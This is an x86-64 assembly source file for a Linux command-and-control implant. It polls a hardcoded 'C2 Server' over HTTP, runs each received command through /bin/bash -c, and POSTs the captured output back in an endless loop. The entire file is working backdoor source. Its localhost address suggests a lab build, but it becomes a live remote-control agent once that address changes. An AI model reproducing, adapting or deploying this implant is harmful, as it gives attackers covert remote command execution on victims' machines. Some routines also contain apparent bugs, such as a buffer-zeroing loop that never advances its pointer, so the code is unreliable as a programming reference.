section .data
    ; Socket data
    server_ip db "127.0.0.1", 0x0           ; IP of C2 Server
    server_port dw 8080                     ; 8080 for alternate HTTP
    socket_fd dq 0x0
    ; Error treating
    err_msg db "Program exits due to errors", 0x0
    err_msg_len dq 0x1c
    ; Http communication strings
    http_GET_msg db "GET / HTTP/1.1", 0x0D ,0x0A, 0x0D ,0x0A, 0x0           ; GET message
    http_GET_msg_len db 0x12                
    ; HTTP POST needs content length to be adjusted every time
    http_POST_msg db "POST / HTTP/1.1", 0x0D, 0x0A                          ; Start line
                db "Content-Type: text/plain", 0x0D, 0x0A                   ; Content-Type header
                db "Content-Length: "                                       ; Placeholder for length
    http_POST_msg_len db 0x3b                                               
    blank_line db 0x0D, 0x0A, 0x0D, 0x0A                                    ; Blank Line
    ; timespec struct
    sleep_time dq 0                         ; seconds     
    sleep_nsec dq 50000000                  ; nanoseconds (50ms)
    ; Misc data
    bash_path db "/bin/bash", 0x0           ; Path to shell
    bash_cmd_str db "-c", 0x0               ; Bash command string option
    cmd_buffer_length dq 0x0                ; Length of the cmd_buffer
    cmd_buffer_old_length dq 0x0            ; Length of the cmd_buffer_old
    tx_buffer_length dq 0x0                 ; Length of the tx_buffer
    status_data dq 0x0                      ; Status of wait4 syscall
    rx_buffer_max_len dq 0x1000             ; Maximum rx buffer length to avoid hardcoding
    tx_buffer_max_len dq 0x1000             ; Maximum tx buffer length to avoid hardcoding

section .bss
    rx_buffer resb 0x1000                   ; Receiving buffer from the server
    tx_buffer resb 0x1000                   ; Transmitting buffer to the server
    cmd_buffer resb 0x1000                  ; Buffer for received command
    cmd_buffer_old resb 0x1000              ; Buffer to store last command
    argv resq 0x4                           ; Argument values for execve call
    pipe_fd resd 0x2                        ; pipe file descriptors for IPC
    ascii_post_cl_number resb 0x15          ; ASCII content length for POST
    ascii_post_cl_decimal_cnt resb 1        ; To store the number of decimal digits

section .text
    global _start
    global fn_connect_client
    global fn_error_exit
    global fn_exit_clean
    global fn_read_socket
    global fn_write_socket
    global fn_get_command
    global fn_poll_socket
    global fn_sleep
    global fn_clean_buffer
    global fn_parse_command
    global fn_exec_cmd
    global fn_buffer_copy
    global fn_make_pipe
    global fn_buffer_cmp
    global fn_cleanup
    global fn_server_callback
    global fn_itoa
    global fn_close_socket

; Function to exit
fn_error_exit:
    ; Print error message
    mov rax, 1  
    mov rdi, 1
    lea rsi, [err_msg]
    movzx rdx, byte [err_msg_len]
    syscall

    mov rax, 0x3c               ; exit syscall
    mov rdi, 0x1                ; 1 return code
    syscall
    ; Shoudln't be here

; Function to exit clean
fn_exit_clean:
    mov rax, 0x3c               ; exit syscall
    xor rdi, rdi                ; 0 return code
    syscall
    ; Shoudln't be here
    
; Debug function to print the cmd_buffer
fn_dbg_print_cmd_buffer:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    ; Write buffer to STDOUT
    mov rax, 0x1                    ; read syscall
    mov rdi, 0x1                    ; STDOUT file descriptor
    lea rsi, [cmd_buffer]           ; pointer to the buffer
    mov rdx, [cmd_buffer_length]    ; buffer size
    syscall

    cmp rax, 0
    jl fn_error_exit            ; exit if an error occurred

    mov rsp, rbp
    pop rbp
    ret

; Function that cleans up after each run to make sure the new iteration works
fn_cleanup:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    ; Cleanup cmd_buffer and tx_buffer
    lea rdi, [cmd_buffer]
    mov rsi, [cmd_buffer_length]
    call fn_clean_buffer 
    lea rdi, [tx_buffer]
    mov rsi, [tx_buffer_length]
    call fn_clean_buffer

    ; Zero buffer lengths
    mov qword [cmd_buffer_length], 0x0
    mov qword [tx_buffer_length], 0x0

    mov rsp, rbp
    pop rbp
    ret

; Function to close socket
fn_close_socket:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    mov rax, 0x3                ; close syscall
    mov rdi, qword [socket_fd]
    syscall

    mov rsp, rbp
    pop rbp
    ret

; Function to compare two buffer
; Parameters:
;   rdi - address of buff1
;   rsi - address of buff2
;   rdx - buffer length of buff1
; Return values:
;   rax - 0 if equal, 1 if not equal
fn_buffer_cmp:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    xor rcx, rcx
.loop:
    mov rax, [rdi+rcx]
    cmp [rsi+rcx], rax
    jne .not_equal
    inc rcx
    cmp rcx, rdx
    jl .loop
    je .equal

.equal:
    xor rax, rax
    jmp .return
.not_equal:
    mov rax, 0x1
.return:
    mov rsp, rbp
    pop rbp
    ret

; Debug function to print the rx_buffer
fn_dbg_print_rx_buffer:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    ; Write buffer to STDOUT
    mov rax, 0x1                    ; read syscall
    mov rdi, 0x1                    ; STDOUT file descriptor
    lea rsi, [rx_buffer]            ; pointer to the buffer
    mov rdx, [rx_buffer_max_len]    ; buffer size
    syscall

    cmp rax, 0
    jl fn_error_exit            ; exit if an error occurred

    mov rsp, rbp
    pop rbp
    ret

; Debug function to print the tx_buffer
fn_dbg_print_tx_buffer:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    ; Write buffer to STDOUT
    mov rax, 0x1                    ; read syscall
    mov rdi, 0x1                    ; STDOUT file descriptor
    lea rsi, [tx_buffer]            ; pointer to the buffer
    mov rdx, [tx_buffer_max_len]    ; buffer size
    syscall

    cmp rax, 0
    jl fn_error_exit            ; exit if an error occurred

    mov rsp, rbp
    pop rbp
    ret

; Function to zero buffers
; Parameters:
; rdi - address of buffer
; rsi - length of buffer
fn_clean_buffer:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    xor rcx, rcx
.loop:
    mov byte [rdi], 0x0         ; Zero out the buffer
    inc rcx
    cmp rcx, rsi
    jl .loop

    mov rsp, rbp
    pop rbp
    ret

; Function to copy a buffer to another buffer
; Make sure the destination buffer is large enough to contain source buffer
; Parameters:
;   rdi - address to buffer 1, destination buffer
;   rsi - address to buffer 2, source buffer
;   rdx - length of buffer 2
fn_buffer_copy:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    xor rcx, rcx
.loop:
    mov al, byte [rsi + rcx]    ; Load byte of source buffer
    mov byte [rdi + rcx], al    ; Copy byte into destination buffer
    inc rcx
    cmp rcx, rdx
    jl .loop

    mov rsp, rbp
    pop rbp
    ret

; Function to create a pipe for child process
; Return values:
;   pipe_fd[0] - reading, parent process end
;   pipe_fd[1] - writing, child process end
fn_make_pipe:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    mov rax, 0x16               ; pipe syscall
    lea rdi, [pipe_fd]          ; Load address of int pipe_fd[2]
    syscall

    cmp rax, 0x0                ; Error checking
    jl fn_error_exit

    mov rsp, rbp
    pop rbp
    ret

; Function to convert int from raw to ASCII
; Parameters:
;   rdi - integer to convert
fn_itoa:
    push rbp
    mov rbp, rsp
    sub rsp, 0x18                ; Stackframe
    push rbx
    push r9

    lea rbx, [ascii_post_cl_number]     ; Point to the result buffer
    add rbx, 20                         ; Start from the end of the buffer
    mov byte [rbx], 0                   ; Null-terminate the string
    
    xor rcx, rcx
.loop:
    xor rdx, rdx                        ; Clear remainder
    mov rax, rdi                        ; Load the number into RAX
    mov rsi, 10                         ; Divisor (base 10)
    div rsi                             ; Divide RAX by 10: RAX = quotient, RDX = remainder
    add dl, '0'                         ; Convert remainder to ASCII ('0' + remainder)
    dec rbx                             ; Move backward in the buffer
    mov [rbx], dl                       ; Store the ASCII character

    inc rcx                             ; Increment digit count
    mov rdi, rax                        ; Load the quotient back into RDI
    cmp rax, 0x0                        ; Check if quotient is zero
    jnz .loop                           ; Repeat until the number is fully converted

    ; Store decimal count
    mov byte [ascii_post_cl_decimal_cnt], cl

    pop r9
    pop rbx
    mov rsp, rbp
    pop rbp
    ret
    
; Function to send POST and data to the server
fn_server_callback:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    ; Copy POST message to tx_buffer
    lea rdi, [tx_buffer]
    lea rsi, [http_POST_msg]
    movzx rdx, byte [http_POST_msg_len]
    call fn_buffer_copy
    
    ; Copy content length ascii number to tx_buffer
    lea rdi, [tx_buffer]
    movzx rax, byte [http_POST_msg_len]
    add rdi, rax
    ; Here is the weird conversion
    lea rsi, [ascii_post_cl_number]
    mov rax, 20
    movzx rcx, byte [ascii_post_cl_decimal_cnt]
    sub rax, rcx
    add rsi, rax
    movzx rdx, byte [ascii_post_cl_decimal_cnt]
    call fn_buffer_copy

    ; Copy blank lines to tx_buffer
    lea rdi, [tx_buffer]
    movzx rax, byte [http_POST_msg_len]
    movzx rcx, byte [ascii_post_cl_decimal_cnt]
    add rax, rcx
    add rdi, rax
    lea rsi, [blank_line]
    mov rdx, 0x4
    call fn_buffer_copy

    ; Write to the socket
    lea rsi, [tx_buffer]
    mov rdx, qword [tx_buffer_length]
    call fn_write_socket

    mov rsp, rbp
    pop rbp
    ret

; Function that spawns a child process through fork syscall.
; Child executes command through execve syscall
; Pipes STDOUT of child process through to parent process
fn_exec_cmd:
    push rbp
    mov rbp, rsp
    sub rsp, 0x10               ; Stackframe

    ; Call fork to split into child and parent processes
    mov rax, 0x39               ; fork syscall
    syscall

    cmp rax, 0x0
    je .child_process_branch    ; rc = 0, child
    jg .parent_process_branch   ; rc > 0, PID of child, parent
    jmp fn_error_exit           ; rc < 0, error
    
.parent_process_branch:

    mov r9, rax                 ; Save PID

    ; Wait for the child process to terminate
    mov rax, 0x3d               ; wait4 syscall
    mov rdi, r9                 ; pid of child
    lea rsi, [status_data]      ; Pointer to store status
    xor rdx, rdx                ; options = 0 (default behavior)
    xor r10, r10                ; rusage = NULL (no resource usage info)
    syscall

    cmp rax, 0
    jl fn_error_exit            ; Exit if wait4 fails

    ; Use ioctl to get number of bytes available
    mov rax, 0x10               ; ioctl syscall
    mov edi, dword [pipe_fd]    ; pipe_fd[0]
    mov rsi, 0x541B             ; FIONREAD command
    lea rdx, [rsp+8]            ; Pointer to result buffer
    syscall

    mov rdx, qword [rsp+8]      ; Copy number of bytes available from stack into rdx

    mov r9, rdx                 ; Save number of bytes available
    mov r10, r9                 ; Save number of bytes available
    ; Convert hex to ASCII
    mov rdi, rdx
    call fn_itoa

    ; Accomodate POST message
    add r9b, byte [http_POST_msg_len]               ; Add POST message length to the buffer length
    add r9b, byte [ascii_post_cl_decimal_cnt]       ; Add the number of decimal digits to the buffer length
    add r9, 0x4                                     ; Blank line length
    mov qword [tx_buffer_length], r9

    sub r9, r10                                     ; Write at correct position

    ; Read bytes from pipe with offset to tx_buffer to accomodate POST message
    xor rax, rax                                    ; read syscall
    mov edi, dword [pipe_fd]                        ; pipe_fd[0]
    ; Load address of transmit buffer with offset
    lea rsi, [tx_buffer]
    add rsi, r9
    mov rdx, r10                                    ; Byte count in rdx
    syscall
 
    ; Jump to return
    jmp .return
.child_process_branch:

    ; Use dup2 to redirect STDOUT to pipe
    ; After this call, execve output will be redirected to pipe
    mov rax, 0x21               ; dup2 syscall
    mov rdi, [pipe_fd+4]        ; oldfd = pipe_fd[1]
    mov rsi, 0x1                ; newfd = 1 (STDOUT)
    syscall

    ; Close write pipe
    mov rax, 0x3                ; close syscall
    mov rdi, [pipe_fd+4]
    syscall

    ; argv loading
    lea rdi, [bash_path]        ; argv[0] = /bin/bash
    mov [argv], rdi
    lea rdi, [bash_cmd_str]     ; argv[1] = -c
    mov [argv+8], rdi
    lea rdi, [cmd_buffer]       ; argv[2] = command to execute
    mov [argv+16], rdi
    xor rdi, rdi                ; argv[3] = NULL
    mov [argv+24], rdi

    mov rax, 0x3b               ; execve syscall
    lea rdi, [bash_path]        ; char *filename
    lea rsi, [argv]             ; char *argv
    mov rdx, 0x0                ; char *envp
    syscall

    ; Shouldn't be here
    call fn_exit_clean

.return:
    mov rsp, rbp
    pop rbp
    ret

; Function to parse the received command and store it in cmd_buffer
fn_parse_command:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    ; Trick is to find \r\n\r\n in http command
    ; Iterate through the whole buffer to find that pattern
    xor rax, rax                ; The pattern finder
    xor rcx, rcx
    lea rdi, [rx_buffer]

    ; if (rx_buffer[rcx] == '\r')
    ;    rax++;
    ; else if (rx_buffer[rcx] == '\n')
    ;    rax++;
    ; else if (rx_buffer[rcx] == '\0')
    ;    break;
    ; else
    ;    rax=0;

; Start at rcx = 1, but it will never find command at that offset
.parse_loop:
    inc rcx
    cmp rax, 0x4
    je .break_parse_loop
.compare_0D:
    cmp byte [rdi+rcx], 0x0D    ; Compare to \r
    jne .compare_0A
    inc rax                     ; Hit
    jmp .parse_loop_end
.compare_0A:
    cmp byte [rdi+rcx], 0x0A    ; Compare to \n
    jne .compare_EOF
    inc rax                     ; Hit
    jmp .parse_loop_end
.compare_EOF:
    xor rax, rax                ; If not \r or \n, zero rax
    cmp byte [rdi], 0x0
    je .break_parse_loop
.parse_loop_end:
    jmp .parse_loop

.break_parse_loop:

    ; Here we have rax = 4 or not
    ; Offset of command is rcx
    cmp rax, 0x4                ; Verify if \r\n\r\n has been found
    jne fn_error_exit
    
    ; Copy the command into cmd_buffer and set length of it when \0 is found 
    xor rdx, rdx                ; Use secondary counter
    lea rsi, [cmd_buffer]       ; Load address of command buffer
.copy_loop:
    mov al, byte [rdi+rcx]      ; Load byte from rx_buffer + rcx 
    mov byte [rsi+rdx], al      ; Store byte into cmd_buffer + rdx
    inc rdx
    inc rcx
    mov al, byte [rdi+rcx]
    cmp rax, 0x0
    jne .copy_loop

    mov [cmd_buffer_length], rdx ; Store length of buffer inside cmp_buffer_length

    mov rsp, rbp
    pop rbp
    ret

; Function to sleep to avoid synchronization problems
; Default time is 50ms
fn_sleep:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    mov rax, 0x23               ; nanosleep syscall
    lea rdi, [sleep_time]       ; pointer to timespec struct
    xor rsi, rsi                ; NULL (no remaining time)
    syscall

    mov rsp, rbp
    pop rbp
    ret
; Function to poll the socket for reading
; Return values:
;   rax - number of bytes to be read
fn_poll_socket:
    push rbp
    mov rbp, rsp
    sub rsp, 0x18               ; Stackframe
    ; Poll data from fd
    ; Prepare fds argument
    ;
    ;   struct pollfd {
    ;       int   fd;         /* file descriptor */
    ;       short events;     /* requested events */
    ;       short revents;    /* returned events */
    ;   };

    mov rax, qword [socket_fd]
    mov dword [rsp], eax        ; pollfd.fd = socket_fd
    mov word [rsp+4], 0x1       ; pollfd.events = POLLIN (0x1)
    mov word [rsp+6], 0x0       ; pollfd.revents = 0 (clear field)

    mov rax, 0x7                ; poll syscall
    lea rdi, [rsp]              ; Pointer to pollfd struct
    mov rsi, 0x1                ; nfds = 1
    mov rdx, 0x7d0              ; timeout = 2000ms
    syscall

    ; Check syscall result
    cmp rax, 0                  ; No descriptors are ready
    ;jg .exit                    ; Return if timeout or error

    movzx rax, word [rsp+6]     ; Load revents
    test ax, 0x1                ; Check if POLLIN is set
    jz .exit                    ; Return if not ready

    ; Use ioctl to get number of bytes available
    mov rax, 0x10               ; ioctl syscall
    mov rdi, qword [socket_fd]  ; socket file descriptor
    mov rsi, 0x541B             ; FIONREAD command
    lea rdx, [rsp+8]            ; Pointer to result buffer
    syscall

    mov rax, qword [rsp+8]      ; Return number of bytes read

    mov rsp, rbp
    pop rbp
    ret
.exit:
    call fn_error_exit

; Function to read the raw data of the C2 server
; Reads from the socket file descriptor stored in memory and stores inside rx_buffer
; Parameters:
;   rax - number of bytes to read
; Return values:
;   [rx_buffer] - buffer that has been received
fn_read_socket:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    mov rdx, rax                ; Copy number of bytes to be read 

    ; Reads data from fd
    mov rax, 0x0                ; read syscall
    mov rdi, qword [socket_fd]  ; socket file descriptor
    lea rsi, [rx_buffer]        ; pointer to the buffer
    ; buffer size already in rdx
    syscall

    mov rsp, rbp
    pop rbp
    ret

; Function to write data on the socket to the C2 server
; Writes to the socket file descriptor stored in memory in tx_buffer
; Parameters: 
;   rsi - address of the string to be written
;   rdx - length of the buffer              
fn_write_socket:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    ; Write data to fd
    mov rax, 0x1                ; write syscall
    mov rdi, qword [socket_fd]  ; socket file descriptor
    ; pointer to the buffer is in rsi parameter
    ; buffer size is in rdx parameter
    syscall

    cmp rax, 0x0                ; error treating
    jl fn_error_exit

    mov rsp, rbp
    pop rbp
    ret

; Function to connect to C2 server
; Stores the file descriptor of the socket inside the memory
fn_connect_client:
    push rbp
    mov rbp, rsp
    sub rsp, 0x18               ; Stackframe

    ; Create a socket
    mov rax, 0x29               ; socket syscall
    mov rdi, 0x2                ; domain AF_INET (2)
    mov rsi, 0x1                ; type SOCK_STREAM (1)
    mov rdx, 0x0                ; protocol default (0)
    syscall

    mov [socket_fd], al         ; save socket fd

    ; Setup sockaddr_in structure
    ; 16 bytes
    ; struct sockaddr_in {
    ;   unsigned short sin_family; (2 bytes) AF_INET
    ;   unsigned short sin_port; (2 bytes) htons(8080)
    ;   struct in_addr sin_addr; (4 bytes) 127.0.0.1
    ;   char sin_zero[8]; (8 bytes) padding
    ; }
    mov word [rsp], 0x2             ; sin_family = AF_INET
    mov word [rsp+2], 0x901f        ; sin_port = htons(8080)
    mov dword [rsp+4], 0x0100007f   ; sin_addr = 127.0.0.1
    mov qword [rsp+8], 0x0          ; sin_zero[8] remains zeroed by default
    
    ; Connect to socket
    mov rax, 0x2a               ; connect syscall
    mov rdi, [socket_fd]        ; Load socket file descriptor
    lea rsi, [rsp]              ; Address to stack parameter
    mov rdx, 16                 ; Size of sockaddr_in
    syscall

    mov rsp, rbp
    pop rbp
    ret

; Function to get a command from the server
; This will invoke a write command to the server to query for data
; Return values:
;   [rx_buffer] - parsed command to be executed
fn_get_command:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    ; Write generic GET to server
    lea rsi, [http_GET_msg]             ; Load address into rsi
    movzx rdx, byte [http_GET_msg_len]  ; Load buffer length into rdx
    call fn_write_socket

    ; Wait for server to process
    call fn_sleep

    ; Poll server for data
    call fn_poll_socket

    ; Read command from server
    call fn_read_socket

    ; Parse command from whole buffer and store in cmd_buffer
    call fn_parse_command

    ; Clean rx_buffer after use
    lea rdi, [rx_buffer]
    mov rsi, [rx_buffer_max_len]
    call fn_clean_buffer

    mov rsp, rbp
    pop rbp
    ret

_start:
    mov rbp, rsp

    ; Creates the child-process pipe
    call fn_make_pipe

.loop:
    ; Connection to C2 server
    call fn_connect_client

    test rax, rax                       ; Verify return code
    jnz .server_no_connect

    ; Get command from server
    call fn_get_command

    ; Close connection to C2
    call fn_close_socket
    
    ; Execute command in bash
    call fn_exec_cmd

    ; Store command into old command buffer, can compare afterwards
    lea rdi, [cmd_buffer_old]
    lea rsi, [cmd_buffer]
    mov rdx, qword [cmd_buffer_length]
    call fn_buffer_copy
    mov rax, [cmd_buffer_length]        ; Copy buffer length
    mov [cmd_buffer_old_length], rax

    ; Connection to C2 server
    call fn_connect_client
    
    ; Return output of command
    call fn_server_callback

    ; Close connection to C2
    call fn_close_socket

    mov qword [sleep_time], 0x2         ; Sleep 2 seconds
    call fn_sleep
    mov qword [sleep_time], 0x0 

    ; Cleanup buffers
    call fn_cleanup
    jmp .loop

.server_no_connect:
    ; Close newly made socket
    call fn_close_socket
    mov qword [sleep_time], 0x2         ; Sleep 2 seconds
    call fn_sleep
    mov qword [sleep_time], 0x0 
    jmp .loop

    ; Exit the program
    mov rax, 0x3c               ; exit syscall
    mov rdi, 0x0
    syscall
